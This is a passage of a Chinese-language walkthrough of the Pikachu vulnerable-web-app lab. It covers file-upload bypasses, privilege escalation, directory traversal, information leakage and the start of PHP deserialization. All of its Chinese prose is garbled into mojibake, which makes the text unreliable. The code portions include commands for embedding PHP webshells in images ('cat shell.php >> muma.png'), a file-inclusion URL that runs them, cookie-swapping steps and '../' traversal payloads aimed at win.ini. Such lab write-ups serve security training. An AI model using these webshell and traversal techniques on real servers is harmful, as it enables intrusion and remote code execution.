åŠŸèƒ½åœ¨webåº”ç”¨ç³»ç»Ÿå¾ˆå¸¸è§ï¼Œå½“ç”¨æˆ·ç‚¹å‡»ä¸Šä¼ æŒ‰é’®åï¼Œåå°ä¼šå¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œåˆ¤æ–­,æ¯”å¦‚æ˜¯å¦æ˜¯æŒ‡å®šçš„ç±»å‹ã€åç¼€åã€å¤§å°ç­‰ç­‰ï¼Œç„¶åå°†å…¶æŒ‰ç…§è®¾è®¡çš„æ ¼å¼è¿›è¡Œé‡å‘½ååå­˜å‚¨åœ¨æŒ‡å®šçš„ç›®å½•ã€‚ å¦‚æœè¯´åå°å¯¹ä¸Šä¼ çš„æ–‡ä»¶æ²¡æœ‰è¿›è¡Œä»»ä½•çš„å®‰å…¨åˆ¤æ–­æˆ–è€…åˆ¤æ–­æ¡ä»¶ä¸å¤Ÿä¸¥è°¨ï¼Œåˆ™æ”»å‡»ç€å¯èƒ½ä¼šä¸Šä¼ ä¸€äº›æ¶æ„çš„æ–‡ä»¶ï¼Œæ¯”å¦‚ä¸€å¥è¯æœ¨é©¬ï¼Œä»è€Œå¯¼è‡´åå°æœåŠ¡å™¨è¢«webshellã€‚**\n\n### **client check**\n\n**ç•Œé¢æç¤º`è¿™é‡Œåªå…è®¸ä¸Šä¼ å›¾ç‰‡oï¼`ï¼Œä¸Šä¼ phpæ–‡ä»¶ä¼š`å¼¹æ¡†`æç¤º`ä¸Šä¼ çš„æ–‡ä»¶ä¸ç¬¦åˆè¦æ±‚ï¼Œè¯·é‡æ–°é€‰æ‹©ï¼`**\n\n**F12æ£€æŸ¥å…ƒç´ ,å‘ç°æ˜¯é€šè¿‡JSè¿›è¡Œcheckçš„ï¼Œè¿™æ ·å°±å¾ˆå®¹æ˜“ç»•è¿‡äº†**\n\n```html\n<input class=\"uploadfile\" type=\"file\" name=\"uploadfile\" onchange=\"checkFileExt(this.value)\">\n```\n\n**æ‰¾åˆ°checkçš„JSä»£ç ï¼Œåªå¯¹åç¼€ååšäº†æ ¡éªŒ**\n\n```javascript\nfunction checkFileExt(filename)\n{\n    var flag = false; //çŠ¶æ€\n    var arr = [\"jpg\",\"png\",\"gif\"];\n    //å–å‡ºä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•å\n    var index = filename.lastIndexOf(\".\");\n    var ext = filename.substr(index+1);\n    //æ¯”è¾ƒ\n    for(var i=0;i<arr.length;i++)\n    {\n        if(ext == arr[i])\n        {\n            flag = true; //ä¸€æ—¦æ‰¾åˆ°åˆé€‚çš„ï¼Œç«‹å³é€€å‡ºå¾ªç¯\n            break;\n        }\n    }\n    //æ¡ä»¶åˆ¤æ–­\n    if(!flag)\n    {\n        alert(\"ä¸Šä¼ çš„æ–‡ä»¶ä¸ç¬¦åˆè¦æ±‚ï¼Œè¯·é‡æ–°é€‰æ‹©ï¼\");\n        location.reload(true);\n    }\n}\n```\n\n**ç»•è¿‡æ–¹æ³•ä¸€ï¼š**\n\n**ä¿®æ”¹`JS`ï¼Œç›´æ¥å°†`php`åç¼€ååŠ ä¸Šï¼Œåœ¨æ§åˆ¶å°è¿è¡Œï¼Œç„¶åå°±å¯ä»¥æˆåŠŸä¸Šä¼ phpæ–‡ä»¶äº†**\n\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200529092420.png)\n\n\n\n**ä¸Šä¼ ä¸€ä¸ª info.php å†…å®¹å¦‚ä¸‹ï¼š**\n\n```php\n<?php phpinfo();?>\n```\n\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20200529092714193.png)**\n\n**è·å–åˆ°ä¸Šä¼ è·¯å¾„åç›´æ¥è®¿é—®çœ‹çœ‹**\n\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200529092857.png)**\n\n**ç»•è¿‡æ–¹æ³•äºŒï¼š**\n\n**å°†info.phpåç¼€æ”¹ä¸ºpngï¼Œç„¶åä¸Šä¼ ï¼Œåˆ©ç”¨BPè¿›è¡Œæ‹¦æˆªï¼Œç„¶åå°†pngæ”¹ä¸ºphpé‡æ–°å‘åŒ…**\n\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200529093908.png)**\n\n\n\n### **MIME check**\n\n> **MIMEï¼ˆMultipurpose Internet Mail Extensionsï¼‰å¤šç”¨é€”äº’è¿ç½‘å³é”®æ‰©å±•ç±»å‹ã€‚**\n>\n> **å½“ä¸€ä¸ªæµè§ˆå™¨å¯¹ä¸€ä¸ªæ–‡ä»¶è¿›è¡Œè¯†åˆ«çš„æ—¶å€™ï¼Œä»–ä¼šç»™æ–‡ä»¶å®šä¹‰ä¸€ä¸ªç±»å‹ï¼Œæ”¾åœ¨httpçš„å¤´éƒ¨çš„Content-typeé‡Œé¢ï¼Œæ¯”å¦‚ä¸Šä¼ å›¾ç‰‡ï¼Œå°±ä¼šè‡ªåŠ¨è¯†åˆ«æ˜¯jpgæˆ–è€…pngç­‰**\n\n**ä¸Šä¼ phpæ–‡ä»¶ï¼Œæç¤ºåªèƒ½ä¸Šä¼ å›¾ç‰‡ã€‚**\n\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200529094736.png)**\n\n**æ ¹æ®æç¤ºçœ‹ï¼Œåº”è¯¥åªè¿›è¡Œäº† Content-Type ç±»å‹æ ¡éªŒï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹`MIME`ç±»å‹æ¥ç»•è¿‡ï¼Œæˆ‘ä»¬æ­£å¸¸ä¸Šä¼  php æ–‡ä»¶ï¼Œç„¶åç›´æ¥å°†å…¶æ–‡ä»¶ç±»å‹ä¿®æ”¹ä¸º `image/png`**\n\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200529095523.png)**\n\n**ç„¶åå°±å¯ä»¥æˆåŠŸä¸Šä¼ äº†**\n\n### **getimagesize**\n\n**getimagesize å‡½æ•°ä¼šæ£€æµ‹æ–‡ä»¶æ˜¯å¦æ˜¯å›¾ç‰‡ï¼Œæ‰€ä»¥å¾—é€šè¿‡åˆ¶ä½œå›¾é©¬æ¥ç»•è¿‡è¿™ä¸ªå‡½æ•°æ£€æµ‹ã€‚**\n\n**å›¾ç‰‡é©¬åˆ¶ä½œ**\n\n- **Windows ä¸‹ å›¾é©¬åˆ¶ä½œ**\n\n**æ–¹æ³•ä¸€ï¼š**\n**æˆ‘ä»¬éœ€è¦ä¸€å¼ å›¾ç‰‡`1.jpg `å’Œä¸€å¥è¯æœ¨é©¬å†™å¥½çš„phpæ–‡ä»¶`1.php`** \n**å°†1.jpgå’Œ1.phpæ”¾åˆ°åŒä¸€ç›®å½•ä¸‹,**\n**ç„¶ååœ¨è¯¥ç›®å½•ä¸‹ç”¨cmdæ‰§è¡Œå‘½ä»¤`copy 1.jpg/b + 1.php/a 2.jpg `**\n**æ–°ç”Ÿæˆçš„2.jpgå°±æ˜¯æˆ‘ä»¬åˆ¶ä½œå¥½çš„å›¾ç‰‡é©¬**\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/5d295bd449c1993400.png)**\n**æ–¹æ³•äºŒï¼š**\n**HxDæ‰“å¼€ä¸€å¼ å›¾ç‰‡`1.jpg`**\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/5d295be59cb6829409.png)**\n**åœ¨å›¾ç‰‡æœ«å°¾åŠ ä¸Šä¸€å¥è¯æœ¨é©¬ï¼Œä¿å­˜å¾—åˆ°çš„å›¾ç‰‡å°±æ˜¯å›¾ç‰‡é©¬äº†**\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/5d295c7214fb631104.png)**\n\n- **Linux ä¸‹ å›¾é©¬åˆ¶ä½œ**\n\n```bash\n#æ–¹æ³•1 å°†shell.phpå†…å®¹è¿½åŠ åˆ°muma.png\ncat shell.php >> muma.png\n\n#æ–¹æ³•2 png+phpåˆæˆpngå›¾é©¬\ncat a.png shell.php >> muma.png\n\n#æ–¹æ³•3 ç›´æ¥ä½¿ç”¨echoè¿½åŠ åˆ°pngä¸­\necho '<?php phpinfo();?>' >> muma.png\n```\n\n**å°†åˆ¶ä½œå¥½çš„å›¾ç‰‡é©¬ä¸Šä¼ **\n\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20200529110623157.png)**\n\n**ä½†æ˜¯æœåŠ¡å™¨å°†æœ¨é©¬æ–‡ä»¶è§£ææˆäº†å›¾ç‰‡æ–‡ä»¶ï¼Œå› æ­¤å‘å…¶å‘é€æ‰§è¡Œè¯¥æ–‡ä»¶çš„è¯·æ±‚æ—¶ï¼ŒæœåŠ¡å™¨åªä¼šè¿”å›è¿™ä¸ªâ€œå›¾ç‰‡â€æ–‡ä»¶ï¼Œå¹¶ä¸ä¼šæ‰§è¡Œç›¸åº”å‘½ä»¤ã€‚æˆ‘ä»¬éœ€è¦åˆ©ç”¨å‰é¢çš„`æ–‡ä»¶åŒ…å«æ¼æ´`å¯ä»¥å°†å›¾ç‰‡æ ¼å¼çš„æ–‡ä»¶å½“åšphpæ–‡ä»¶æ¥è§£ææ‰§è¡Œ**\n\n```\nhttp://127.0.0.1/pikachu-master/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2020/05/29/6589365ed07a93cc13b725773978.jpg&submit=%E6%8F%90%E4%BA%A4\n```\n\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20200529110401162.png)**\n\n\n\n### **æ–‡ä»¶ä¸Šä¼ æ¼æ´é˜²èŒƒ**\n\n- **éªŒè¯æ–‡ä»¶ç±»å‹ã€åç¼€åã€å¤§å°;**\n- **éªŒè¯æ–‡ä»¶çš„ä¸Šä¼ æ–¹å¼;**\n- **å¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œä¸€å®šå¤æ‚çš„é‡å‘½å;**\n- **ä¸è¦æš´éœ²æ–‡ä»¶ä¸Šä¼ åçš„è·¯å¾„;**\n\n##  **over permission**\n\n> **å¦‚æœä½¿ç”¨Aç”¨æˆ·çš„æƒé™å»æ“ä½œBç”¨æˆ·çš„æ•°æ®ï¼ŒAçš„æƒé™å°äºBçš„æƒé™ï¼Œå¦‚æœèƒ½å¤ŸæˆåŠŸæ“ä½œï¼Œåˆ™ç§°ä¹‹ä¸º`è¶Šæƒæ“ä½œ`ã€‚ è¶Šæƒæ¼æ´å½¢æˆçš„åŸå› æ˜¯åå°ä½¿ç”¨äº†ä¸åˆç†çš„æƒé™æ ¡éªŒè§„åˆ™å¯¼è‡´çš„ã€‚ä¸€èˆ¬è¶Šæƒæ¼æ´å®¹æ˜“å‡ºç°åœ¨æƒé™é¡µé¢ï¼ˆéœ€è¦ç™»å½•çš„é¡µé¢ï¼‰å¢ã€åˆ ã€æ”¹ã€æŸ¥çš„çš„åœ°æ–¹ï¼Œå½“ç”¨æˆ·å¯¹æƒé™é¡µé¢å†…çš„ä¿¡æ¯è¿›è¡Œè¿™äº›æ“ä½œæ—¶ï¼Œåå°éœ€è¦å¯¹ å¯¹å½“å‰ç”¨æˆ·çš„æƒé™è¿›è¡Œæ ¡éªŒï¼Œçœ‹å…¶æ˜¯å¦å…·å¤‡æ“ä½œçš„æƒé™ï¼Œä»è€Œç»™å‡ºå“åº”ï¼Œè€Œå¦‚æœæ ¡éªŒçš„è§„åˆ™è¿‡äºç®€å•åˆ™å®¹æ˜“å‡ºç°è¶Šæƒæ¼æ´ã€‚**\n>\n> **å› æ­¤ï¼Œåœ¨åœ¨æƒé™ç®¡ç†ä¸­åº”è¯¥éµå®ˆï¼š**\n> **1.ä½¿ç”¨æœ€å°æƒé™åŸåˆ™å¯¹ç”¨æˆ·è¿›è¡Œèµ‹æƒ;**\n> **2.ä½¿ç”¨åˆç†ï¼ˆä¸¥æ ¼ï¼‰çš„æƒé™æ ¡éªŒè§„åˆ™;**\n> **3.ä½¿ç”¨åå°ç™»å½•æ€ä½œä¸ºæ¡ä»¶è¿›è¡Œæƒé™åˆ¤æ–­,åˆ«åŠ¨ä¸åŠ¨å°±çç”¨å‰ç«¯ä¼ è¿›æ¥çš„æ¡ä»¶;**\n\n### **æ°´å¹³è¶Šæƒ**\n\n>**Aç”¨æˆ·å’ŒBç”¨æˆ·å±äºåŒä¸€çº§åˆ«ç”¨æˆ·ï¼Œä½†å„è‡ªä¸èƒ½æ“ä½œå¯¹æ–¹ä¸ªäººä¿¡æ¯ã€‚Aç”¨æˆ·å¦‚æœè¶Šæƒæ“ä½œBç”¨æˆ·ä¸ªäººä¿¡æ¯çš„æƒ…å†µç§°ä¸ºæ°´å¹³è¶Šæƒæ“ä½œã€‚**\n\n**1ã€ç‚¹å‡»å³ä¸Šè§’çš„æç¤ºï¼Œå­˜åœ¨ä¸‰ä¸ªç”¨æˆ·ï¼Œã€lucy/123456,lili/123456,kobe/123456ã€‘**\n\n**2ã€ç™»å½•ç”¨æˆ·lucyï¼Œå¯ä»¥æŸ¥çœ‹lucyçš„ä¿¡æ¯ï¼Œ**\n\n**3ã€æˆ‘ä»¬å°†URLä¸­çš„usernameæ”¹ä¸ºliliæˆ–kobeï¼Œå‘ç°èƒ½æˆåŠŸè¶ŠæƒæŸ¥çœ‹åˆ°liliæˆ–kobeçš„ä¿¡æ¯ï¼Œè¿™ä¹Ÿå°±è¯´æ˜å­˜åœ¨æ°´å¹³è¶Šæƒæ¼æ´**\n\n**æºç åˆ†æ**\n\n```php\n// åˆ¤æ–­æ˜¯å¦ç™»å½•ï¼Œæ²¡æœ‰ç™»å½•ä¸èƒ½è®¿é—®\nif(!check_op_login($link)){\n    header(\"location:op1_login.php\");\n}\n$html='';\nif(isset($_GET['submit']) && $_GET['username']!=null){\n    //æ²¡æœ‰ä½¿ç”¨sessionæ¥æ ¡éªŒ,è€Œæ˜¯ä½¿ç”¨çš„ä¼ è¿›æ¥çš„å€¼ï¼Œæƒé™æ ¡éªŒå‡ºç°é—®é¢˜,è¿™é‡Œåº”è¯¥è·Ÿç™»å½•æ€å…³ç³»è¿›è¡Œç»‘å®š\n    $username=escape($link, $_GET['username']);\n    $query=\"select * from member where username='$username'\";\n```\n\n **åªåˆ¤æ–­äº†æ˜¯å¦ç™»å½•ï¼Œå¹¶æ²¡æœ‰éªŒè¯ä¼ å…¥çš„usernameæ˜¯ä¸æ˜¯å½“å‰ç™»å½•ç”¨æˆ·**\n\n### **å‚ç›´è¶Šæƒ**\n\n> **Aç”¨æˆ·æƒé™é«˜äºBç”¨æˆ·ï¼ŒBç”¨æˆ·è¶Šæƒæ“ä½œAç”¨æˆ·çš„æƒé™çš„æƒ…å†µç§°ä¸ºå‚ç›´è¶Šæƒã€‚**\n\n**1ã€ç‚¹å‡»å³ä¸Šè§’çš„æç¤ºï¼Œå­˜åœ¨ä¸¤ä¸ªç”¨æˆ·ï¼Œã€admin/123456,pikachu/000000,adminæ˜¯è¶…çº§bossã€‘**\n\n**2ã€ç™»å½•è¶…çº§ç”¨æˆ·adminï¼Œå¯ä»¥æŸ¥çœ‹æ‰€æœ‰ç”¨æˆ·ä¿¡æ¯ï¼Œå¹¶ä¸”å¯ä»¥åˆ›å»ºæ–°ç”¨æˆ·**\n\n**3ã€ç‚¹å‡»æ·»åŠ ç”¨æˆ·ï¼Œè¾“å…¥jwtç”¨æˆ·ä¿¡æ¯ï¼Œç„¶åæ‰“å¼€Burpï¼Œè¿›è¡ŒæŠ“åŒ…ï¼Œå‘ç°Cookieä¸­æœ‰PHPSESSIDï¼Œå†å‘é€åˆ°`repeater`ï¼Œè¿›è¡Œå‘åŒ…ï¼ŒæˆåŠŸæ·»åŠ æ–°ç”¨æˆ·jwt**\n\n**4ã€ç™»å½•æ™®é€šç”¨æˆ·pikachuï¼Œåªæœ‰æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯çš„æƒé™ï¼›ç„¶åä½¿ç”¨BurpæŠ“å–å…¶ç™»å½•æ€çš„Cookieï¼Œå°†Cookieå¤åˆ¶åˆ°ä¸Šé¢è¶…çº§ç®¡ç†å‘˜ç™»å½•æ—¶çš„Cookieä½ç½®,æœ€åç‚¹å‡»`Go`**\n\n**5ã€åˆ·æ–°é¡µé¢,çœ‹åˆ°åˆ›å»ºäº†ä¸¤ä¸ªjwtç”¨æˆ·ï¼Œç¬¬ä¸€ä¸ªæ˜¯adminåˆ›å»ºçš„ï¼Œç¬¬äºŒä¸ªæ˜¯pikachuåˆ›å»ºçš„ï¼Œæ™®é€šç”¨æˆ·pikachuä¹ŸæˆåŠŸåˆ›å»ºç”¨æˆ·ï¼Œè¿™å°±å®ç°äº†å‚ç›´è¶Šæƒ**\n\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200713140917.png)**\n\n**æºç åˆ†æ**\n\n```php\n//ç›®å½•ç»“æ„\nop2_admin.php\nop2_admin_edit.php\nop2_login.php\nop2_user.php\n```\n\n**æœ‰ä¸€ä¸ª`op2_login.php`ï¼Œè¿›è¡Œç™»å½•åˆ¤æ–­ï¼Œå¦‚æœçº§åˆ«æ˜¯1ï¼Œè¿›å…¥`op2_admin.php`ï¼›å¦‚æœçº§åˆ«æ˜¯2ï¼Œè¿›å…¥`op2_user.php`ï¼Œç™»å…¥adminç”¨æˆ·ç•Œé¢ï¼Œæœ‰ä¸ª`admin_edit.php`é¡µé¢ï¼Œå¯ä»¥æ·»åŠ æ–°ç”¨æˆ·ï¼Œä½†æ˜¯æ·»åŠ æ–°ç”¨æˆ·æ—¶ï¼Œåªæ˜¯éªŒè¯äº†ç™»å½•çŠ¶æ€ï¼Œå¹¶æ²¡æœ‰éªŒè¯çº§åˆ«ï¼Œæ‰€ä»¥å­˜åœ¨è¶Šæƒé—®é¢˜ã€‚**\n\n```php\n//admin_edit.php 22-25è¡Œ\n// åˆ¤æ–­æ˜¯å¦ç™»å½•ï¼Œæ²¡æœ‰ç™»å½•ä¸èƒ½è®¿é—®\n//è¿™é‡Œåªæ˜¯éªŒè¯äº†ç™»å½•çŠ¶æ€ï¼Œå¹¶æ²¡æœ‰éªŒè¯çº§åˆ«ï¼Œæ‰€ä»¥å­˜åœ¨è¶Šæƒé—®é¢˜ã€‚\nif(!check_op2_login($link)){\n    header(\"location:op2_login.php\");\n    exit();\n}\n```\n\n### **CTFä¾‹å­**\n\n**[NKCTF-webï¼ˆè®°ä¸€æ¬¡è¶Šæƒï¼‰](https://blog.csdn.net/jiyi_guoshu/article/details/88544274)**\n\n## **Directory Traversal**\n\n>**åœ¨webåŠŸèƒ½è®¾è®¡ä¸­,å¾ˆå¤šæ—¶å€™æˆ‘ä»¬ä¼šè¦å°†éœ€è¦è®¿é—®çš„æ–‡ä»¶å®šä¹‰æˆå˜é‡ï¼Œä»è€Œè®©å‰ç«¯çš„åŠŸèƒ½ä¾¿çš„æ›´åŠ çµæ´»ã€‚ å½“ç”¨æˆ·å‘èµ·ä¸€ä¸ªå‰ç«¯çš„è¯·æ±‚æ—¶ï¼Œä¾¿ä¼šå°†è¯·æ±‚çš„è¿™ä¸ªæ–‡ä»¶çš„å€¼(æ¯”å¦‚æ–‡ä»¶åç§°)ä¼ é€’åˆ°åå°ï¼Œåå°å†æ‰§è¡Œå…¶å¯¹åº”çš„æ–‡ä»¶ã€‚ åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œå¦‚æœåå°æ²¡æœ‰å¯¹å‰ç«¯ä¼ è¿›æ¥çš„å€¼è¿›è¡Œä¸¥æ ¼çš„å®‰å…¨è€ƒè™‘ï¼Œåˆ™æ”»å‡»è€…å¯èƒ½ä¼šé€šè¿‡â€œ../â€è¿™æ ·çš„æ‰‹æ®µè®©åå°æ‰“å¼€æˆ–è€…æ‰§è¡Œä¸€äº›å…¶ä»–çš„æ–‡ä»¶ã€‚ ä»è€Œå¯¼è‡´åå°æœåŠ¡å™¨ä¸Šå…¶ä»–ç›®å½•çš„æ–‡ä»¶ç»“æœè¢«éå†å‡ºæ¥ï¼Œå½¢æˆç›®å½•éå†æ¼æ´ã€‚**\n>\n>**çœ‹åˆ°è¿™é‡Œ,ä½ å¯èƒ½ä¼šè§‰å¾—ç›®å½•éå†æ¼æ´å’Œä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½ï¼Œç”šè‡³æ–‡ä»¶åŒ…å«æ¼æ´æœ‰å·®ä¸å¤šçš„æ„æ€ï¼Œæ˜¯çš„ï¼Œç›®å½•éå†æ¼æ´å½¢æˆçš„æœ€ä¸»è¦çš„åŸå› è·Ÿè¿™ä¸¤è€…ä¸€æ ·ï¼Œéƒ½æ˜¯åœ¨åŠŸèƒ½è®¾è®¡ä¸­å°†è¦æ“ä½œçš„æ–‡ä»¶ä½¿ç”¨å˜é‡çš„æ–¹å¼ä¼ é€’ç»™äº†åå°ï¼Œè€Œåˆæ²¡æœ‰è¿›è¡Œä¸¥æ ¼çš„å®‰å…¨è€ƒè™‘è€Œé€ æˆçš„ï¼Œåªæ˜¯å‡ºç°çš„ä½ç½®æ‰€å±•ç°çš„ç°è±¡ä¸ä¸€æ ·ï¼Œå› æ­¤ï¼Œè¿™é‡Œè¿˜æ˜¯å•ç‹¬æ‹¿å‡ºæ¥å®šä¹‰ä¸€ä¸‹ã€‚**\n>\n>**éœ€è¦åŒºåˆ†ä¸€ä¸‹çš„æ˜¯,å¦‚æœä½ é€šè¿‡ä¸å¸¦å‚æ•°çš„urlï¼ˆæ¯”å¦‚ï¼šhttp://xxxx/docï¼‰åˆ—å‡ºäº†docæ–‡ä»¶å¤¹é‡Œé¢æ‰€æœ‰çš„æ–‡ä»¶ï¼Œè¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬æˆä¸ºæ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œè€Œå¹¶ä¸å½’ä¸ºç›®å½•éå†æ¼æ´ã€‚**\n\n**éšæ„ç‚¹å‡»é¡µé¢ï¼Œå¾—åˆ°è·³è½¬é“¾æ¥ã€‚**\n\n```\nhttp://127.0.0.1/pikachu-master/vul/dir/dir_list.php?title=truman.php\n```\n\n**å¯ä»¥çœ‹åˆ°`URL`ä¸­æœ‰æ–‡ä»¶åï¼Œé‚£æˆ‘ä»¬å¯ä»¥è¿›è¡Œæ„é€ ï¼Œå®ç°ç›®å½•éå†**\n\n```\n?title=../../../../phpinfo.php\n?title=../../../../Windows/win.ini\n\nå»æ‰urlä¸­çš„å‚æ•°ï¼Œåˆ—å‡ºäº†diræ–‡ä»¶å¤¹é‡Œé¢æ‰€æœ‰çš„æ–‡ä»¶ï¼Œè¿™ç§æƒ…æ™¯ç§°ä¸ºæ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œè€Œå¹¶ä¸å½’ä¸ºç›®å½•éå†æ¼æ´ã€‚\nhttp://127.0.0.1/pikachu-master/vul/dir/\n```\n\n**æºç åˆ†æ**\n\n```php\n$html='';\nif(isset($_GET['title'])){\n    $filename=$_GET['title'];\n    //è¿™é‡Œç›´æ¥æŠŠä¼ è¿›æ¥çš„å†…å®¹è¿›è¡Œäº†require(),é€ æˆé—®é¢˜\n    require \"soup/$filename\";\n//    echo $html;\n}\n```\n\n**ä¿®å¤**\n\n**ç™½åå•æˆ–è€…è¿‡æ»¤ç”¨æˆ·è¾“å…¥ï¼Œæ¯”å¦‚è¿‡æ»¤`../`**\n\n## **æ•æ„Ÿä¿¡æ¯æ³„éœ²**\n\n>**ç”±äºåå°äººå‘˜çš„ç–å¿½æˆ–è€…ä¸å½“çš„è®¾è®¡ï¼Œå¯¼è‡´ä¸åº”è¯¥è¢«å‰ç«¯ç”¨æˆ·çœ‹åˆ°çš„æ•°æ®è¢«è½»æ˜“çš„è®¿é—®åˆ°ã€‚ æ¯”å¦‚ï¼š**\n>**---é€šè¿‡è®¿é—®urlä¸‹çš„ç›®å½•ï¼Œå¯ä»¥ç›´æ¥åˆ—å‡ºç›®å½•ä¸‹çš„æ–‡ä»¶åˆ—è¡¨;**\n>**---è¾“å…¥é”™è¯¯çš„urlå‚æ•°åæŠ¥é”™ä¿¡æ¯é‡Œé¢åŒ…å«æ“ä½œç³»ç»Ÿã€ä¸­é—´ä»¶ã€å¼€å‘è¯­è¨€çš„ç‰ˆæœ¬æˆ–å…¶ä»–ä¿¡æ¯;**\n>**---å‰ç«¯çš„æºç ï¼ˆhtml,css,jsï¼‰é‡Œé¢åŒ…å«äº†æ•æ„Ÿä¿¡æ¯ï¼Œæ¯”å¦‚åå°ç™»å½•åœ°å€ã€å†…ç½‘æ¥å£ä¿¡æ¯ã€ç”šè‡³è´¦å·å¯†ç ç­‰;**\n>\n>**ç±»ä¼¼ä»¥ä¸Šè¿™äº›æƒ…å†µï¼Œæˆ‘ç§°ä¸ºæ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚**\n\n**1.æ‰“å¼€ç•Œé¢æ˜¯ä¸€ä¸ªç™»é™†é¡µé¢ï¼ŒæŸ¥çœ‹æºç å‘ç°æ•æ„Ÿä¿¡æ¯**\n\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200714090924.png)**\n\n**2.ç™»é™†ä¹‹åå‘ç°abc.php**\n\n**3.ä¸ç™»å½•ç›´æ¥å°†findabc.phpæ”¹ä¸ºabc.phpä¹Ÿå¯è®¿é—®**\n\n## **PHPååºåˆ—åŒ–**\n\n**åœ¨ç†è§£è¿™ä¸ªæ¼æ´å‰,ä½ éœ€è¦å…ˆææ¸…æ¥šphpä¸­serialize()ï¼Œunserialize()è¿™ä¸¤ä¸ªå‡½æ•°ã€‚**\n\n**åºåˆ—åŒ–serialize()**\n**åºåˆ—åŒ–è¯´é€šä¿—ç‚¹å°±æ˜¯æŠŠä¸€ä¸ªå¯¹è±¡å˜æˆå¯ä»¥ä¼ è¾“çš„å­—ç¬¦ä¸²,æ¯”å¦‚ä¸‹é¢æ˜¯ä¸€ä¸ªå¯¹è±¡:**\n\n```php\n    class S{\n        public $test=\"pikachu\";\n    }\n    $s=new S(); //åˆ›å»ºä¸€ä¸ªå¯¹è±¡\n    serialize($s); //æŠŠè¿™ä¸ªå¯¹è±¡è¿›è¡Œåºåˆ—åŒ–\n    åºåˆ—åŒ–åå¾—åˆ°çš„ç»“æœæ˜¯è¿™ä¸ªæ ·å­çš„:O:1:\"S\":1:{s:4:\"test\";s:7:\"pikachu\";}\n        O:ä»£è¡¨object\n        1:ä»£è¡¨å¯¹è±¡åå­—é•¿åº¦ä¸ºä¸€ä¸ªå­—ç¬¦\n        S:å¯¹è±¡çš„åç§°\n        1:ä»£è¡¨å¯¹è±¡é‡Œé¢æœ‰ä¸€ä¸ªå˜é‡\n        s:æ•°æ®ç±»å‹\n        4:å˜é‡åç§°çš„é•¿åº¦\n        test:å˜é‡åç§°\n        s:æ•°æ®ç±»å‹\n        7:å˜é‡å€¼çš„é•¿åº¦\n        pikachu:å˜é‡å€¼\n```\n\n**ååºåˆ—åŒ–unserialize()**\n\n**å°±æ˜¯æŠŠè¢«åºåˆ—åŒ–çš„å­—ç¬¦ä¸²è¿˜åŸä¸ºå¯¹è±¡,ç„¶ååœ¨æ¥ä¸‹æ¥çš„ä»£ç ä¸­ç»§ç»­ä½¿ç”¨ã€‚**\n\n```php\n    $u=unserialize(\"O:1:\"S\":1:{s:4:\"test\";s:7:\"pikachu\";}\");\n    echo $u->test; //å¾—åˆ°çš„ç»“æœä¸ºpikachu\n```\n\n**åºåˆ—åŒ–å’Œååºåˆ—åŒ–æœ¬èº«æ²¡æœ‰é—®é¢˜,ä½†æ˜¯å¦‚æœååºåˆ—åŒ–çš„å†…å®¹æ˜¯ç”¨æˆ·å¯ä»¥æ§åˆ¶çš„,ä¸”åå°ä¸æ­£å½“çš„ä½¿ç”¨äº†PHPä¸­çš„é­”æ³•å‡½æ•°,å°±ä¼šå¯¼è‡´å®‰å…¨é—®é¢˜**\n\n```php\n        å¸¸è§çš„å‡ ä¸ªé­”æ³•å‡½æ•°:\n        __construct()å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨\n\n        __destruct()å½“ä¸€ä¸ªå¯¹è±¡é”€æ¯æ—¶è¢«è°ƒç”¨\n\n        __toString()å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨\n\n        __sleep() åœ¨å¯¹è±¡åœ¨è¢«åºåˆ—åŒ–ä¹‹å‰è¿è¡Œ\n\n        